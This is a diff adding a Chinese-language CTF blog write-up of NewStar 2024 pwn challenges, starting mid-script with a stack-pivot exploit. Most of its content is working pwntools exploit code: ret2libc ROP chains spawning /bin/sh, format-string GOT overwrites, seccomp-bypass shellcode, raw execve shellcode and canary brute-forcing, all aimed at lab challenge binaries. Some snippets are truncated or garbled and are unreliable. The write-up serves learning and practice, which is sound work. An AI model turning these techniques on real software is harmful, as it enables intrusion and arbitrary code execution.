+data = io.recvuntil(b&#39;&gt;&gt; &#39;)
+print(data)
+padding=0x58
+payload=b&#39;a&#39;*padding +p64(city_addr)+p64(have_a_rest)
+io.sendline(payload)
+
+###栈迁移
+data = io.recvuntil(b&#39;&gt;&gt; &#39;)
+print(data)
+payload = b&#39;b&#39;*(padding-8)+p64(0x10000+0x50)+p64(read_addr)
+#gdb.attach(io)
+#pause()
+io.sendline(payload)
+
+shellcode=asm(shellcraft.amd64.sh())
+print(&quot;length:&quot;,len(shellcode))
+#gdb.attach(io)
+#pause()
+payload=shellcode.ljust(padding,b&#39;\x00&#39;)+p64(0x10000)
+io.sendline(payload)
+io.interactive()
+</code></pre>
+<h1 id="Newstar-2024"><a href="#Newstar-2024" class="headerlink" title="Newstar 2024"></a>Newstar 2024</h1><h1 id="week1-1"><a href="#week1-1" class="headerlink" title="week1"></a>week1</h1><h2 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h2><p>main函数</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530950036-15809efe-8e92-496b-bedc-afb9d78375b3.png"></p>
+<p>fun函数</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530949913-ba5e0ad9-6add-4831-8bac-aa3fab4b5220.png"></p>
+<p>需要输入一个password。前十个数相同就执行win，win是后门函数。点击password，是NewStar!!!</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530950186-76ce8027-85f7-4998-9ec3-9b5e692c9191.png"></p>
+<p>连上以后输入NewStar!!!就行</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530950187-c304f531-718c-4f20-a25c-e3f68045867e.png"></p>
+<h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>game函数</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530949946-b115bf5e-f29f-47c9-9c69-d5a45cf50e93.png"></p>
+<p>需要输入超过999的数会执行后门。每次只能输入一个大于0小于10的数，然后不要超过5秒。循环输入数字最后互动</p>
+<pre><code class="language-plain">from pwn import *
+p=remote(&quot;192.168.202.1&quot;,35166)
+p.recvuntil(&#39;pls input you num: &#39;)
+
+n = 100
+for i in range(n):
+    p.sendline(b&#39;10&#39;)
+    
+p.interactive()
+</code></pre>
+<h2 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h2><p>需要的是s的值，buf和s一样就可以open flag</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530951079-cec36cab-bd57-43f7-9f4d-42a390f819a2.png"></p>
+<p>直接点s的话是没有东西。那需要gdb调试</p>
+<p>调试出来的结果是s是</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530951101-0dc3eaa6-96ae-426c-8f19-fd9b917cb166.png"></p>
+<p>看到加密的是这个直接发送</p>
+<pre><code class="language-plain">from pwn import *
+ 
+#p = process(&#39;./gdb&#39;)
+p= remote(&#39;192.168.202.1&#39;,29547)
+#context.log_level = &#39;debug&#39;
+#gdb.attach(p, &#39;b *$rebase(0x1872)&#39;)
+
+p.sendline(b&#39;\x5D\x1D\x43\x55\x53\x45\x57\x45&#39;)
+p.interactive()
+</code></pre>
+<h2 id="overwrite"><a href="#overwrite" class="headerlink" title="overwrite"></a>overwrite</h2><p>fun函数</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530951725-1e90d0ba-0ae7-4f4d-bbac-7e14a4123782.png"></p>
+<p>nbytes &gt;48 就会exit ,nptr &gt; 114514就会getflag</p>
+<p>这两个之间的距离是0x30。这个题就是要跳过前面的长度检查。if的时候没有限制。有符号比较，然后read没有符号比较。可以通过输入负数。然后没有符号比较的时候它就是很大的一个数</p>
+<pre><code class="language-plain">from pwn import *
+
+p = remote(&#39;192.168.202.1&#39;,53731)
+payload = b&#39;a&#39;*0x30 + b&#39;114515&#39;
+p.recv(b&#39;: &#39;)
+p.sendline(b&#39;-1&#39;)
+p.recv(b&#39;: &#39;)
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530951610-abc3247c-be51-47c5-93d8-6cfe15c48675.png"></p>
+<h1 id="week2-1"><a href="#week2-1" class="headerlink" title="week2"></a>week2</h1><h2 id="Ezgame"><a href="#Ezgame" class="headerlink" title="Ezgame"></a>Ezgame</h2><p>libc题。有0x80.可以读0x100</p>
+<p>libcsearch不知道为啥查不出来，直接用libc版本。（这个dump有问题？）</p>
+<pre><code class="language-plain">from pwn import*
+from LibcSearcher import *
+
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)  
+e = ELF(&quot;./ezgame&quot;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+p=process(&quot;./ezgame&quot;)
+#p=remote(&#39;27.25.151.26&#39;,46071)
+
+ret_addr=0x400509
+rdi_address = 0x400783
+puts_plt = e.plt[&#39;puts&#39;]
+puts_got = e.got[&#39;puts&#39;] 
+main_address =e.symbols[&#39;main&#39;]
+
+payload = b&#39;A&#39;*(0x50+8)
+payload += p64(rdi_address)
+payload += p64(puts_got)
+payload += p64(puts_plt)
+payload += p64(main_address)
+
+p.recvuntil(b&quot;Welcome to NewStarCTF!!!!\n&quot;)
+
+p.send(payload)
+p.recvuntil(b&#39;\x0a&#39;) 
+puts_real_address = u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
+print(&quot;puts_real_address: &quot;,hex(puts_real_address))
+
+libc=LibcSearcher(&quot;puts&quot;,puts_real_address)
+libc_base = puts_real_address -libc.dump[&#39;puts&#39;]
+system_address = libc_base + libc.dump[&#39;system&#39;]
+binsh_address = libc_base + libc.dump(&quot;str_bin_sh&quot;)
+
+payload = b&quot;A&quot;*(0x50+8)
+payload += p64(ret_addr)# stack alignment
+payload += p64(rdi_address)
+payload += p64(binsh_address)
+payload += p64(system_address)
+
+p.recvuntil(b&#39;Welcome to NewStarCTF!!!!\n&#39;)
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530951686-ca30d2ac-1b55-497b-aeb7-5c1c1f1995d4.png"></p>
+<p>libc版本的</p>
+<pre><code class="language-plain">from pwn import*
+
+#context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)  
+e = ELF(&quot;./ezgame&quot;)
+libc = ELF(&quot;./libc-2.31.so&quot;)
+#p=process(&quot;./ezgame&quot;)
+p=remote(&#39;192.168.202.1&#39;,46085)
+
+ret_addr=0x400509
+rdi_address = 0x400783
+puts_plt = e.plt[&#39;puts&#39;]
+puts_got = e.got[&#39;puts&#39;] 
+main_address =e.symbols[&#39;main&#39;]
+
+payload = b&#39;A&#39;*(0x50+8)
+payload += p64(rdi_address)
+payload += p64(puts_got)
+payload += p64(puts_plt)
+payload += p64(main_address)
+
+p.recvuntil(b&quot;Welcome to NewStarCTF!!!!\n&quot;)
+
+p.send(payload)
+p.recvuntil(b&#39;\x0a&#39;) 
+puts_real_address = u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
+print(&quot;puts_real_address: &quot;,hex(puts_real_address))
+
+libc_base = puts_real_address -libc.sym[&#39;puts&#39;]
+system_address = libc_base + libc.sym[&#39;system&#39;]
+binsh_address = libc_base + next(libc.search(b&quot;/bin/sh&quot;))
+
+payload = b&quot;A&quot;*(0x50+8)
+payload += p64(ret_addr)# stack alignment
+payload += p64(rdi_address)
+payload += p64(binsh_address)
+payload += p64(system_address)
+
+p.recvuntil(b&#39;Welcome to NewStarCTF!!!!\n&#39;)
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530952006-e6c7227a-72fa-4c88-ab68-b879b63d6760.png"></p>
+<h2 id="My-GBC"><a href="#My-GBC" class="headerlink" title="My_GBC!!!!!"></a>My_GBC!!!!!</h2><p><a target="_blank" rel="noopener" href="https://hnusec-star.feishu.cn/wiki/AMDjwALobiy3c1kF0hacm9Oxn4e">是ret2csu。</a></p>
+<p>要先对加密函数进行解密。然后用csu是rop链不足。没有办法设置更多寄存器的值</p>
+<p>gat1和gat2的片段</p>
+<pre><code class="language-plain">.text:0000000000401390
+.text:0000000000401390 loc_401390:                             ; CODE XREF: __libc_csu_init+54↓j
+.text:0000000000401390                 mov     rdx, r14
+.text:0000000000401393                 mov     rsi, r13
+.text:0000000000401396                 mov     edi, r12d
+.text:0000000000401399                 call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]
+.text:000000000040139D                 add     rbx, 1
+.text:00000000004013A1                 cmp     rbp, rbx
+.text:00000000004013A4                 jnz     short loc_401390
+.text:00000000004013A6
+.text:00000000004013A6 loc_4013A6:                             ; CODE XREF: __libc_csu_init+35↑j
+.text:00000000004013A6                 add     rsp, 8
+.text:00000000004013AA                 pop     rbx
+.text:00000000004013AB                 pop     rbp
+.text:00000000004013AC                 pop     r12
+.text:00000000004013AE                 pop     r13
+.text:00000000004013B0                 pop     r14
+.text:00000000004013B2                 pop     r15
+.text:00000000004013B4                 retn
+.text:00000000004013B4 ; &#125; // starts at 401350
+.text:00000000004013B4 __libc_csu_init endp
+</code></pre>
+<p>把后门写到bss段是可以的，或者直接用libc寻找也可以。这直接用libc找吧</p>
+<h3 id="0x38的偏移是怎么得到的"><a href="#0x38的偏移是怎么得到的" class="headerlink" title="0x38的偏移是怎么得到的"></a>0x38的偏移是怎么得到的</h3><p>编译器通常会为对齐在 buf 后再插入 0x20 字节的填充（padding），满足 16 字节对齐。</p>
+<p>因此，从缓冲区起始到返回地址的距离：</p>
+<pre><code class="language-plain">buf (0x10) + padding (0x20) + saved RBP (0x8) = 0x38
+</code></pre>
+<p>这样就得到了 0x38 的静态计算值。 </p>
+<p>Key</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530951944-5cbb77cf-953e-4929-bd2c-f6080288ab04.png"></p>
+<pre><code class="language-plain">from pwn import *
+
+def ror(val, n):
+    return ((val &gt;&gt; n) | (val &gt; 8) &amp; 0xffff
+
+payload = b&quot;%&quot; + str(low_byte).encode() + b&quot;c&quot;
+payload += b&quot;%12$hhn&quot;
+
+padding = middle_bytes - low_byte
+payload += b&quot;%&quot; + str(padding).encode() + b&quot;c&quot;
+payload += b&quot;%13$hn&quot;
+
+payload = payload.ljust(0x20, b&#39;A&#39;)
+
+payload += p64(elf.got[&#39;printf&#39;])
+payload += p64(elf.got[&#39;printf&#39;] + 1)
+
+p.sendafter(b&quot;: \n&quot;, payload)
+
+p.sendlineafter(b&quot;: \n&quot;, b&quot;sh;&quot;)
+
+p.interactive()
+</code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530952753-51e9eb13-4fd5-4985-b7eb-e8b3d273ae8a.png"></p>
+<p>（这个题没搞清楚，照着答案wp写的）</p>
+<h2 id="Inverted-World"><a href="#Inverted-World" class="headerlink" title="Inverted World"></a>Inverted World</h2><p>这个题，不用覆盖到canary拿到shell.它程序运行到bookdoor满足main里面的条件就能把flag打印出来。就是后门里面写的这个</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530952954-ba83bfd7-1227-428a-bda3-08875d5cae76.png"></p>
+<p>不用绕过canay，栈溢出就行。然后它这个read函数定义的时候是反的读的,i–.输入的时候也要反着输入</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530953060-cb858dea-7d8c-4537-8e1f-a9a73c79be85.png"></p>
+<p>read读取的很大就溢出就行。不写到canary就不用绕过canary</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530953442-561c28e8-a156-47e4-83b1-38b366eb6118.png"></p>
+<pre><code class="language-plain">from pwn import*
+
+context.log_level=&#39;debug&#39;
+
+p=remote(&#39;&#39;, ?????)
+
+payload=b&#39;a&#39;*0x100
+p.sendline(payload+p64(0x040137C)[::-1])
+p.sendlineafter(&quot;root@AkyOI-VM:~#&quot;, &quot;hs&quot;)
+p.sendline(&quot;cat flag&quot;)
+p.interactive()
+</code></pre>
+<h1 id="week3-1"><a href="#week3-1" class="headerlink" title="week3"></a>week3</h1><h2 id="不可思议的scnaf"><a href="#不可思议的scnaf" class="headerlink" title="不可思议的scnaf"></a>不可思议的scnaf</h2><p>这道题是有后门的。</p>
+<p><a target="_blank" rel="noopener" href="https://hnusec-star.feishu.cn/wiki/MBY5wupjOiIMNikeSSBcFEbBn8e">是要用scnaf来绕过canary</a>。查了资料以后发现scnaf如果输入的是参数（%d）的话.如果输入+，-。它会跳过输入。就用这个来跳过canary的检查</p>
+<p>运行程序后输出一句话。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530953408-9db7bbb7-36b0-42ea-acf0-58319918dbcb.png"></p>
+<p>banner函数打不开应该就是画的老八的这张图的函数</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530953642-e0a08b86-3ffc-4fa6-a941-b8dcb81547c2.png"></p>
+<p>有溢出。v6这有个数组越界。向v6写16个但是只有6个.我们可以先用加号把前面的canary跳过。然后输入后门函数再退出（覆盖rbp）。再把剩下的填满。（保证平衡还是对齐）</p>
+<p>加号就是占位符。把原来的canary的值给占了。反正就是跳过了</p>
+<p>但是这个地址不知道是什么。给的wp里面是0x401240不知道这个是干什么的</p>
+<p>后来查了一下原来是这样</p>
+<p>之后改成现在的后门的就行</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530953991-20480d89-30d4-4ca5-ac6b-9f97cfa316f0.png"></p>
+<p>现在的后门的</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530953676-2fc68204-b748-4e37-8082-6c59dae7e2b3.png"></p>
+<p>远程没改。后门还是原来的</p>
+<pre><code class="language-plain">from pwn import *
+
+#context(arch=&#39;amd64&#39;, os=&#39;linux&#39;)
+
+p = remote(&#39;192.168.202.1&#39;, 10291)
+
+for _ in range(10):
+    p.recvuntil(&#39;わたし、気になります！&#39;)
+    p.sendline(b&#39;+&#39;)
+
+p.recvuntil(&#39;わたし、気になります！&#39;)
+p.sendline(str(0x401261))
+
+p.recvuntil(&#39;わたし、気になります！&#39;)
+p.sendline(str(0))
+
+for _ in range(4):
+    p.recvuntil(&#39;わたし、気になります！&#39;)
+    p.sendline(b&#39;+&#39;)
+
+p.interactive()
+</code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530954195-ae77b2d3-fd96-43e0-a127-cbdc054e70a1.png"></p>
+<h2 id="Easy-Shellcode"><a href="#Easy-Shellcode" class="headerlink" title="Easy_Shellcode"></a>Easy_Shellcode</h2><p>沙箱题。禁用了orw。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530954171-0af5558c-4fb8-47c1-932d-f675441b075a.png"></p>
+<p>ai分析了一下sandbox.具体是这些</p>
+<ul>
+<li><strong>禁止的系统调用：</strong><code>execve</code>、<code>execveat</code>、<code>open</code>、<code>openat</code>、<code>read</code>、<code>write</code> 等。</li>
+<li><strong>允许的系统调用：</strong><code>openat2</code>、<code>readv</code>、<code>pread64</code>、<code>writev</code>、<code>sendfile</code> 等。</li>
+</ul>
+<p>因此，攻击者无法使用常规的 <code>open</code> 或 <code>read</code> 系统调用来读取文件。</p>
+<p>我们可以利用 openat 打开 &#x2F;flag 文件，使用 sendfile 将文件内容输出到标准输出，从而绕过沙箱限制，获取 flag。</p>
+<pre><code class="language-plain">from pwn import *
+
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+
+p = process(&#39;./Easy_Shellcode&#39;)
+# p = remote(&#39;192.168.202.1&#39;, 57531)
+elf = ELF(&#39;./Easy_Shellcode&#39;)
+
+shellcode = &#39;&#39;&#39;
+    mov rsp, 0x4040c0
+&#39;&#39;&#39;
+shellcode += shellcraft.openat(-100, &quot;/flag&quot;, 0, 0)
+shellcode += shellcraft.sendfile(1, 3, 0, 0x100)
+
+payload = asm(shellcode)
+
+p.sendlineafter(b&#39;Welcome&#39;, payload)
+
+p.interactive()
+</code></pre>
+<p>不同函数都有调用规则。这用的openat和sendfile.<a target="_blank" rel="noopener" href="https://hnusec-star.feishu.cn/wiki/ZZPYwEcXTiZLBpkgPdYcVQGYn7f">沙箱sandbox</a></p>
+<p>手写的shellcode</p>
+<pre><code class="language-plain">from pwn import *
+
+#context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+
+p = process(&#39;./Easy_Shellcode&#39;)
+p=remote(&#39;192.168.202.1&#39;,59734)
+
+p.recvuntil(b&#39;Welcome&#39;)
+p.sendline(b&#39;Hello&#39;)
+
+shellcode = &#39;&#39;&#39;
+    # 打开 /flag 文件
+    mov rdi, 0x67616c66
+    push rdi
+    mov rdi, rsp
+    xor rsi, rsi
+    xor rdx, rdx
+    mov rax, 2
+    syscall
+
+    #读取文件内容到栈
+    mov rsi, rsp
+    mov rdx, 0x100
+    mov rax, 0
+    syscall
+
+    #将读取的内容写入标准输出
+    mov rdi, 1
+    mov rax, 1
+    syscall
+
+    #正常退出
+    mov rax, 60
+    xor rdi, rdi
+    syscall
+&#39;&#39;&#39;
+
+payload = asm(shellcode)
+
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<h2 id="One-Last-B1te"><a href="#One-Last-B1te" class="headerlink" title="One Last B1te"></a>One Last B1te</h2><p>buf只有一次写的机会。但是我们可以通过两次read修改</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530954399-001336c1-2533-4b47-bd9d-825946b1f179.png"></p>
+<p>第一次是直接把8个字节读给buf指针。第二次是读一字节给buf。我们可以这样。先给buf一个地址，然后再通过读一个字节通过buf写一个东西。主要可以这样</p>
+<p>篡改关键控制数据（如函数返回地址的高位或低位），进而实现控制流劫持。</p>
+<p>如果这样的话。那我们先改libc。有了libc之后再算其它的。然后再栈溢出。orw rop链的。</p>
+<p>溢出的话主要就是第三个read。它可以读0x100的</p>
+<p>泄露libc的方法可以是这个。把close的got表改成write的plt表。利用write把它打印出来</p>
+<p>程序中只有 <code>write</code> 函数可以进行输出，我们可以利用一个字节任意地址写的机会，把 <code>close</code> 函数的 GOT 表的数值改为<code>write</code>函数的 PLT 表的地址（因为存在延迟绑定，<code>close</code> 在第一次调用之前指向的是 PLT 中的表项，我们很容易利用修改最低一个字节的方法来使其指向 <code>write</code> 函数的 PLT 表）。</p>
+<p>之后由于 <code>close(1)</code> 设置第一个参数为 1，同时 <code>read(0, v5, 0x110uLL);</code> 会残留第 2、3 个参数，我们修改 <code>close</code> 的 GOT 表之后相当于执行 <code>write(1,v5,0x110uLL);</code>，就可以泄露栈上的内容，正好能泄露 libc 地址，之后利用栈溢出再次启动 <code>main</code> 函数栈溢出 ROP 即可。close(1)时会将rdi指向的值泄露</p>
+<p>官方wp上写的是要交换的话用到</p>
+<p>由于 glibc 2.39 版本不容易控制 rdx 寄存器，我们可以使用 <code>pop rax</code> + <code>xchg eax, edx</code> 的方法来设置 rdx 寄存器的数值。</p>
+<p><code>xchg edx, eax</code> 指令在 x86 汇编中用于 <strong>交换</strong> 两个寄存器的值。执行后，<code>EAX</code> 的原始值将被移入 <code>EDX</code>，而 <code>EDX</code> 的原始值则被移入 <code>EAX</code>。这一操作对程序标志寄存器（EFLAGS）没有影响，也没有副作用（如不设置零标志或进位标志）</p>
+<p><a target="_blank" rel="noopener" href="https://hnusec-star.feishu.cn/wiki/MBY5wupjOiIMNikeSSBcFEbBn8e">设置完mprotect</a>是像csu一样的调用</p>
+<pre><code class="language-plain">from pwn import *
+ELFpath = &#39;./onelast&#39;
+
+p = remote(&#39;192.168.202.1&#39;,9506)
+libc=ELF(&#39;./libc.so.6&#39;)
+
+close_got = elf.got[&#39;close&#39;]
+write_plt = elf.plt[&#39;write&#39;]
+ret = 0x0401447
+main = 0x4013a3
+rubbish = 0x404800 
+
+
+p.sendafter(&quot;Show me your UN-Lucky number :&quot;, p64(close_got))
+p.sendafter(&quot;Try to hack your UN-Lucky number with one byte :&quot;, b&#39;\xc0&#39;)
+
+
+payload = b&#39;a&#39; * 0x18 + p64(ret) + p64(main)
+p.send(payload)
+
+p.recvuntil(b&#39;a&#39; * 0x18)
+p.recv(0xb8 - 0x18)
+libc_base = u64(p.recv(6) + b&#39;\x00\x00&#39;) - 0x710b26c2a28b + 0x710b26c00000
+
+
+p.sendafter(&quot;Show me your UN-Lucky number :&quot;, p64(rubbish))
+p.sendafter(&quot;Try to hack your UN-Lucky number with one byte :&quot;, b&#39;\x70&#39;)
+
+
+pop_rdi = libc_base + 0x010f75b
+pop_rsi = libc_base + 0x110a4d
+binsh = libc_base + 0x1cb42f
+xchg_edx_eax = libc_base + 0x01a7f27
+pop_rax = libc_base + 0x0dd237
+open_a = libc_base + libc.sym[&#39;open&#39;]
+read_a = libc_base + libc.sym[&#39;read&#39;]
+mprotect = libc_base + 0x00125C10
+
+#填充缓冲区
+payload = b&#39;a&#39; * 0x18 
+
+#设置mprotect设置内存权限
+#rdi里写成更改的起始地址
+payload += p64(pop_rdi)  
+payload += p64(libc_base + 0x202000) 
+#rsi里填修改的大小
+payload += p64(pop_rsi) 
+payload += p64(0x2000) 
+#先把值赋给rax之后做交换。要全改。mprotect参数设置为7
+payload += p64(pop_rax)  
+payload += p64(7)  
+#用xchg交换
+payload += p64(xchg_edx_eax)
+payload += p64(mprotect) 
+
+#read函数rdi根据规则置0 
+payload += p64(pop_rdi)  
+payload += p64(0)
+#rsi指向修改的地址（要读的）  
+payload += p64(pop_rsi) 
+payload += p64(libc_base + 0x202000)
+#rax读取最大长度 
+payload += p64(pop_rax) 
+payload += p64(0x1000)
+#交换 
+payload += p64(xchg_edx_eax)  
+payload += p64(read_a)
+#返回地址改成shellcoode起始  
+payload += p64(libc_base + 0x202000)
+p.sendline(payload)
+
+#shellcode写orw
+shellcode = shellcraft.open(&#39;./flag&#39;, 0, 0)
+shellcode += shellcraft.read(&#39;rax&#39;, libc_base + 0x202000 + 0x800, 0x100)
+shellcode += shellcraft.write(2, libc_base + 0x202000 + 0x800, &#39;rax&#39;)
+
+
+p.send(asm(shellcode))
+p.interactive()
+</code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530954285-6ae3b551-8c05-4e67-9c62-ee539ae73d18.png"></p>
+<pre><code class="language-plain">p.sendafter(&quot;Show me your UN-Lucky number :&quot;, p64(close_got))
+p.sendafter(&quot;Try to hack your UN-Lucky number with one byte :&quot;, b&#39;\xc0&#39;)
+
+payload = b&#39;a&#39; * 0x18 + p64(ret) + p64(main)
+p.send(payload)
+
+p.recvuntil(b&#39;a&#39; * 0x18)
+p.recv(0xb8 - 0x18)
+libc_base = u64(p.recv(6) + b&#39;\x00\x00&#39;) - 0x710b26c2a28b + 0x710b26c00000
+
+p.sendafter(&quot;Show me your UN-Lucky number :&quot;, p64(rubbish))
+p.sendafter(&quot;Try to hack your UN-Lucky number with one byte :&quot;, b&#39;\x70&#39;)
+</code></pre>
+<p>先把close.got表的低位写成xc0。write在libc中的低位地址。填充以后返回接收libc。填充是为了再改一遍。把这个rubbish低位改成x70。不知道这个rubbish是改的什么.第一下看成0x404000。以为改的是这个</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530955181-25673a35-ec5c-4f9d-b09f-dc6113e7d7d1.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530954905-16f31bc1-5648-4c71-b679-62b7973df804.png"></p>
+<p>0x404800没有了。不知道它这个改的哪。</p>
+<h2 id="ezcanary"><a href="#ezcanary" class="headerlink" title="ezcanary"></a>ezcanary</h2><p>这个爆破不出来</p>
+<pre><code class="language-plain">from pwn import *
+
+p = remote(&#39;192.168.202.1&#39;, 59734)
+canary = b&#39;\x00&#39;
+
+for byte_index in range(1, 8):
+    for guess in range(256):
+        payload = b&#39;A&#39; * (0x60 - 8)
+        payload += canary
+        payload += p8(guess)
+        p.sendafter(&#39;你觉得呢？\n&#39;, payload)
+        resp = p.recvuntil(&#39;\n&#39;, timeout=1)
+        if b&quot;*** stack smashing detected ***&quot; in resp:
+            p.send(&#39;n\n&#39;)
+        else:
+            canary += p8(guess)
+            info(f&quot;[+] Found canary byte &#123;byte_index&#125;: 0x&#123;guess:02x&#125;&quot;)
+            break
+    else:
+        log.error(f&quot;Failed to find byte &#123;byte_index&#125;&quot;)
+        exit(1)
+
+    if byte_index != 7:
+        p.send(&#39;a\n&#39;)
+    else:
+        p.sendline(&#39;cat flag&#39;)
+
+canary_val = u64(canary)
+print(&quot;Canary is:&quot;, hex(canary_val))
+
+payload2 = b&#39;A&#39; * (0x60 - 8)
+payload2 += p64(canary_val)
+payload2 += p64(0)
+payload2 += p64(0x401251)
+p.sendafter(&quot;bruteforce\n&quot;, payload2)
+p.interactive()
+</code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530955144-3d748e7c-ae6c-4174-8595-689138ffd982.png"></p>
+<h1 id="week4-1"><a href="#week4-1" class="headerlink" title="week4"></a>week4</h1><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>fgo的英灵克制系统吗。关键我怎么知道对面每次出什么职阶的。纯赌运气到1145分吗🤔。</p>
+<p>剑弓枪互克，骑术杀互克。狂阶与其它全部互克</p>
+<p>裁仇月互克，他人格伪降互克，盾兵无克制。还有单克的记不起来了。不能cheat看看这个游戏怎么玩</p>
+<p>486打法吗。无限读档这块。用狂战士breasker无限回档吧。</p>
+<pre><code class="language-plain">from pwn import *
+
+#context(log_level=&#39;debug&#39;, arch=&#39;amd64&#39;, os=&#39;linux&#39;)
+p=remote(&#39;192.168.202.1&#39;,45950)
+
+#p = process(&#39;./Signin&#39;)
+p.sendlineafter(b&#39;Enter your name:&#39;, b&#39;inkey&#39;)
+elf = ELF(&#39;./Signin&#39;)
+
+score = 0
+
+def fight():
+    global score
+    p.sendlineafter(b&#39;6. Save file&#39;, b&#39;1&#39;)
+    p.sendlineafter(b&#39;Choose your class:&#39;, b&#39;Berserker&#39;)
+    p.recvline() 
+    result = b&#39;You beated&#39; in p.recvline()
+    p.recvuntil(b&#39;Now you have &#39;)
+    score = int(p.recvuntil(b&#39; sorce&#39;, drop=True))
+    p.sendline(b&#39;&#39;)
+    p.sendline(b&#39;&#39;)
+    return result
+
+def save():
+    p.sendlineafter(b&#39;6. Save file&#39;, b&#39;6&#39;)
+    p.sendline(b&#39;&#39;)  # 发送空行
+
+def load():
+    p.sendlineafter(b&#39;6. Save file&#39;, b&#39;5&#39;)
+    p.sendline(b&#39;&#39;)  # 发送空行
+
+load()
+
+while True:
+    if fight():
+        print(&quot;win&quot;)
+        print(f&quot;score: &#123;score&#125;&quot;)
+        if score &gt; 1145:
+            break
+        save()
+    else:
+        print(&quot;lose&quot;)
+        print(f&quot;score: &#123;score&#125;&quot;)
+        load()
+
+print(&quot;Got shell&quot;)
+p.sendline(b&quot;cat /flag&quot;)
+
+p.interactive()
+</code></pre>
+<h2 id="MakeHero"><a href="#MakeHero" class="headerlink" title="MakeHero"></a>MakeHero</h2><p>照着wp先写了一下。有点还没看懂</p>
+<pre><code class="language-plain">from pwn import *
+
+p = remote(&#39;192.168.202.1&#39;, 14310)
+libc = ELF(&#39;./herolibc.so.6&#39;)
+
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;)
+context.log_level = &#39;debug&#39;
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+
+def u8_ex(data):
+    if isinstance(data, str):
+        data = data.encode(&#39;latin-1&#39;)
+    data = data.ljust(1, b&#39;\x00&#39;)
+    return u64(data)
+
+def write_mem(addr, val):
+    if isinstance(val, bytes):
+        data = val
+    else:
+        data = p8(val)
+    sla(b&#39;\x89\xef\xbc\x81&#39;, hex(addr) + &#39; &#39; + hex(u8_ex(data)))
+
+def write_code(addr, code_bytes):
+    for i, b in enumerate(code_bytes):
+        write_mem(addr + i, b)
+
+def my_recvuntil(delim):
+    return p.recvuntil(delim)
+
+my_recvuntil(b&#39;** &#39;)
+code_base = int(p.recvuntil(b&#39; -&#39;, drop=True), 16)
+print(&#39;code_base =&#39;, hex(code_base))
+
+my_recvuntil(b&#39;## &#39;)
+libc_base = int(p.recvuntil(b&#39; -&#39;, drop=True), 16)
+print(&#39;libc_base =&#39;, hex(libc_base))
+
+sl(b&#39;inkey&#39;)
+
+write_mem(code_base + 0x1877, 1)
+write_mem(libc_base + libc.sym.exit + 4, b&#39;\x90&#39;)
+write_mem(code_base + 0x1877, 1)
+
+shellcode = b&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff&quot; \
+            b&quot;\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54&quot; \
+            b&quot;\x5e\xb0\x3b\x0f\x05&quot;
+write_code(libc_base + libc.sym.exit + 5, shellcode)
+
+sl(b&#39;bye&#39;)
+p.interactive()
+</code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530956257-b7637af8-f8eb-4ee1-b247-c23f6fdd060f.png"></p>
+<h2 id="Reread"><a href="#Reread" class="headerlink" title="Reread"></a>Reread</h2><p>栈迁移和沙箱。read只能读0x50.覆盖完rbp以后只剩0x10.不够写rop。所以栈迁移</p>
+<p>把rbp的值改成对应的地址。应该就是改到bss。然后加8是指针</p>
+<p>看一下有没有leave</p>
